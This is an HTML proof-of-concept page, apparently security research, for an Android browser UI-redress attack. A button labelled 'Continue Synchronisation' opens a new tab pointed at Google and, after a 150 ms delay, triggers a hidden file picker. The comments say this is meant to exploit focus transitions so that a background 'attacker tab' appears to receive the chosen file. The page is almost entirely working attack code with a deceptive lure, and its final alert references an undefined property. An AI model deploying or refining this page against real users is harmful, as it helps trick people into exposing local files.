<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Research - UI Redress</title>
    <style>
        body { margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; background: #202124; color: white; font-family: sans-serif; }
        #trigger { padding: 25px 50px; background: #8ab4f8; color: black; border-radius: 30px; font-weight: bold; cursor: pointer; border: none; font-size: 1.1rem; }
        #fileInput { display: none; }
    </style>
</head>
<body>

    <input type="file" id="fileInput">
    <button id="trigger">Lanjutkan Sinkronisasi</button>

    <script>
        const trigger = document.getElementById('trigger');
        const fileInput = document.getElementById('fileInput');

        trigger.addEventListener('click', () => {
            // 1. Inisialisasi navigasi ke tab baru
            // Kita simpan referensi window untuk "mengelabui" manajemen fokus
            const newTab = window.open('about:blank', '_blank');

            // 2. Gunakan micro-delay untuk menyisipkan dialog
            // Tujuannya agar dialog terpanggil SAAT tab baru sedang 'request focus'
            setTimeout(() => {
                // Navigasikan tab baru ke target asli (Google)
                if (newTab) {
                    newTab.location.href = 'https://www.google.com';
                }

                // Tepat setelah instruksi navigasi, tembak dialog file picker
                // Ini mencoba memanfaatkan celah saat browser sedang sibuk memproses navigasi
                fileInput.click();
                
            }, 150); // Delay 150ms adalah celah kritis pada transisi UI Android
        });

        fileInput.onchange = (e) => {
            if (e.target.files.length > 0) {
                console.log('POC Berhasil: File diakses oleh tab latar belakang.');
                alert('Peringatan: File "' + e.target.files.name + '" berhasil dikirim ke tab penyerang!');
            }
        };
    </script>
</body>
</html>
